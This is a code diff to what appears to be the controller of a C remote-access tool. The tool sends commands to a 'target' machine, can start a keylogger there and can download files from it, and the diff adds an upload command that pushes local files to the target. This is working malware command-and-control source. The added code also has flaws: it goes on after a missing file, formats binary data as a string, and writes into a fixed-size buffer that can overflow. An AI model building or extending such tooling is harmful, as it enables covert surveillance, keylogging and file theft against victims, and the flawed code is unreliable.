@@ -73,8 +73,51 @@ int main()
     // Clean the command
     strtok(buffer, "\n");
 
-    // Send command to target
-    send(client_socket, buffer, sizeof(buffer), 0);
+    if (strncmp("upload ", buffer, 7) == 0)
+    {
+      info("Uploading file...");
+      // Get the filename after cf
+      char *filename = str_cut(buffer, 7, 100);
+
+      // Read the file contents
+      FILE *file;
+      file = fopen(filename, "rb");
+
+      // Check if file exists
+      if (file == NULL)
+      {
+        // Send error message
+        char err[128];
+        sprintf(err, "[-] File %s not found.\n", filename);
+        error(err);
+      }
+
+      // Get file size
+      fseek(file, 0, SEEK_END);
+
+      // Get file size
+      int size = ftell(file);
+
+      // Reset file pointer
+      rewind(file);
+
+      // Allocate memory for file contents
+      char *file_contents = malloc(size * (sizeof(char)));
+
+      // Read file contents
+      fread(file_contents, sizeof(char), size, file);
+
+      char rspns[18384];
+      sprintf(rspns, "file:%d:%s:%s", size, filename, file_contents);
+
+      // Send file contents
+      send(client_socket, rspns, sizeof(rspns), 0);
+    }
+    else
+    {
+      // Send command to target
+      send(client_socket, buffer, sizeof(buffer), 0);
+    }
 
     // Quit if input is "q"
     if (strncmp("q", buffer, 1) == 0)
@@ -88,7 +131,7 @@ int main()
       info("Starting keylogger...");
       continue;
     }
-    if (strncmp("download ", buffer, 9) == 0)
+    else if (strncmp("download ", buffer, 9) == 0)
     {
       warning("NOTE: Please be aware of some formatting issues.");
       info("Receiving file...");
@@ -138,6 +181,3 @@ int main()
 
   return 0;
 }
-
-/*
- */
